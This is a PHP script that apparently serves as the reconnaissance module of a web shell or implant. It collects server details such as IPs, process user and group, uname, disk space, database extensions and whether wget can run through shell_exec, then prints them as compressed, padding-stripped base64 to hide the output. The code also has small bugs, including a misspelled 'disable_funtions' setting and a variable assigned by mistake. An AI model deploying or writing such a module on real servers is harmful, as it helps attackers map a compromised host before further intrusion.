<?php

$start = microtime(true);

function sysinfo()
{
    global $start;
    $downloaders = []; $debug = []; $status = false;

    try{$cwd = getcwd();}
    catch(Exception $e){array_push($debug, ['exp' => 'cwd']); $cwd = NULL;}

    try{if(isset($_SERVER['SERVER_ADDR'])){$server_ip = $_SERVER['SERVER_ADDR'];}else{$server_ip = NULL;}}
    catch(Exception $e){array_push($debug, ['exp' => 'server ip']); $server_ip = NULL;}

    try{if(isset($_SERVER['REMOTE_ADDR'])){$user_ip = $_SERVER['REMOTE_ADDR'];}else{$user_ip = NULL;}}
    catch(Exception $e){array_push($debug, ['exp' => 'remote ip']); $user_ip = NULL;}

    try{if(isset($_SERVER['SERVER_SOFTWARE'])){$software = $_SERVER['SERVER_SOFTWARE'];}else{$server_ip = NULL;}}
    catch(Exception $e){array_push($debug, ['exp' => 'software']); $software = NULL;}

    try{$user = posix_getpwuid(posix_getuid())['name'];}
    catch(Exception $e){array_push($debug, ['exp' => 'user']); $user = NULL;}

    try{$group = posix_getgrgid(posix_getegid())['name'];}
    catch(Exception $e){array_push($debug, ['exp' => 'group']); $group = NULL;}

    try{$php_version = $php_version = phpversion();}
    catch(Exception $e){array_push($debug, ['exp' => 'version']); $php_version = NULL;}

    try{$os = PHP_OS;}
    catch(Exception $e){array_push($debug, ['exp' => 'os']); $os = NULL;}

    try{$total_space = disk_total_space('/');}
    catch(Exception $e){array_push($debug, ['exp' => 'total storage']); $total_space = NULL;}

    try{$free_space = disk_free_space('/');}
    catch(Exception $e){array_push($debug, ['exp' => 'free storage']); $free_space = NULL;}

    try{$uname = php_uname();}
    catch(Exception $e){array_push($debug, ['exp' => 'uname']); $uname = NULL;}

    try{$wget = function_exists('shell_exec') && is_executable('/usr/bin/wget');}
    catch(Exception $e){$wget = NULL;}

    try{$downloaders = stream_get_wrappers();}
    catch(Exception $e){array_push($debug, ['exp' => 'stream wrappers']); $downloaders = NULL;}

    try{$ini = ini_get_all();}
    catch(Exception $e){array_push($debug, ['exp' => 'ini']); $ini = NULL;}

    try{$extensions = get_loaded_extensions();}
    catch(Exception $e){array_push($debug, ['exp' => 'extensions']); $extensions = NULL;}

    try{$functions = get_defined_functions();}
    catch(Exception $e){array_push($debug, ['exp' => 'functions']); $functions = NULL;}

    if ($wget!=true) {array_push($downloaders, 'wget');}
    if ($debug == []) {$status = true;}

    $response = json_encode(array(
        'status' => $status,
        'time' => microtime(true)-$start,
        'debug' => $debug,
        'operation' => [
            'action' => 'sysinfo',
            'arguments' => null
        ],
        'data' => [
            'cwd' => $cwd,
            'ip' => [
                'server' => $server_ip,
                'client' => $user_ip,
            ],
            'uname' => $uname,
            'user' => $user,
            'group' => $group,
            'php' => $php_version,
            'os' => $os,
            'software' => $software,
            'disk' => [
                'total' => $total_space,
                'free' => $free_space,
            ],
            'downloaders' => $downloaders,
            'curl' => extension_loaded('curl'),
            'wget' => function_exists('shell_exec') && !empty(shell_exec('wget --version')),
            'mysql' => extension_loaded('mysql'),
            'sqlit3' => extension_loaded('sqlite3'),
            'oracle' => extension_loaded('oci8'),
            'postgresql' => extension_loaded('pgsql'),
            'disabled' => ini_get('disable_funtions'),
            // 'extensions' => $extensions,
            // 'ini' => $ini,
            // 'functions' => $functions
        ]
    ), JSON_UNESCAPED_UNICODE);

    echo str_replace('=', '', base64_encode(gzdeflate($response, "9")));
    // echo $response;
}

@sysinfo();
?>